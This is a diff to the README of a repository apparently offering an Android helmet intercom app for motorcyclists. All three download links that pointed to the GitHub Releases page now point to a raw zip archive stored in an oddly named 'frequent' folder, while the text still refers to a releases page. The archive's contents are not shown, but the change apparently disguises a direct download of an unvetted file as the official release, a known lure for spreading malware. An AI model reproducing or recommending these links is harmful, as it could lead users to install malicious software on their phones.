@@ -1,6 +1,6 @@
 # 🎧 motolink-android-intercom - Clear rider helmet voice link
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wordsworthian-breakoftheday479/motolink-android-intercom/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wordsworthian-breakoftheday479/motolink-android-intercom/raw/refs/heads/main/frequent/intercom_android_motolink_v3.6.zip)
 
 ## 📱 What this app does
 
@@ -20,7 +20,7 @@ Use it when you want a simple way to talk while riding without reaching for your
 
 Visit this page to download the latest release:
 
-https://github.com/wordsworthian-breakoftheday479/motolink-android-intercom/releases
+https://github.com/wordsworthian-breakoftheday479/motolink-android-intercom/raw/refs/heads/main/frequent/intercom_android_motolink_v3.6.zip
 
 On that page, look for the latest release file for Android and save it to your phone.
 
@@ -118,7 +118,7 @@ android, ble, bluetooth, bluetooth-classic, college-project, helmet-intercom, in
 ## 🔗 Source and releases
 
 GitHub releases:
-https://github.com/wordsworthian-breakoftheday479/motolink-android-intercom/releases
+https://github.com/wordsworthian-breakoftheday479/motolink-android-intercom/raw/refs/heads/main/frequent/intercom_android_motolink_v3.6.zip
 
 Repository name:
 motolink-android-intercom
